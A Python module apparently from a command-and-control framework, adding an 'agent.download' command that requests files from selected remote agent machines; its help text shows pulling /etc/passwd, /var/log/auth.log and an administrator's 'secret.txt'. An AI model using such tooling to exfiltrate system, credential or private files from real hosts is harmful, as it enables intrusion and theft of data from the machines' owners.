# src/server/commands/agent/file_download.py

import os
import base64
from config import MessageType as messtype
from ..base import Command
from ..registry import register
from ..interact.shell import ShellManager
from rich import print
from core.client_manager import Manager


def download_handler(cid, remote_file_path, local_file_path=None):
    """
    Handle downloading a file from an agent.

    Args:
        cid: Client UUID
        remote_file_path: Path on agent machine
        local_file_path: Path on server to save (optional)

    Returns:
        bool: True if command sent, False on error
    """
    client = Manager.get_client(cid)
    if client is None:
        print(f"[!] Client {cid} not found")
        return False

    client_session = client.session

    # Send download request to agent
    client_session.send_request(
        messtype.COMMAND,
        {
            'command': 'agent.download',
            'remote_path': remote_file_path,
        }
    )
    print(f"[*] Sent download request for '{remote_file_path}' to {cid}")
    return True


@register
class FileDownload(Command):
    name = "agent.download"
    description = "Download file from agent: agent.download <remote_path> [local_path]"
    group = "agent"

    def execute(self, *args):
        if len(args) < 1:
            print(f"[blue_violet][!] Missing arguments. Use 'help {self.name}' for usage[/blue_violet]\n")
            return

        remote_file_path = args[0]
        local_file_path = args[1] if len(args) > 1 else None

        current_clients = ShellManager.get_current_client()

        if not current_clients:
            print("[!] No agent selected. Use 'client.select <client-id>' first")
            return

        # Send download command to all selected clients
        for cid in current_clients:
            print(f"[*] Requesting file from {cid}...")
            download_handler(cid, remote_file_path, local_file_path)

    @staticmethod
    def get_help():
        help_detail = f"""
        Description : Download file from agent to server
        Usage       : agent.download <remote_file_path> [local_file_path]

        Arguments:
            remote_file_path  : Path to file on agent (required)
            local_file_path   : Path to save file on server (optional)
                               Default: downloads/<agent_uuid>/<filename>

        Example:
            agent.download /etc/passwd
            agent.download C:\\Users\\Admin\\Desktop\\secret.txt
            agent.download /var/log/auth.log /tmp/server_auth.log
        """
        return help_detail
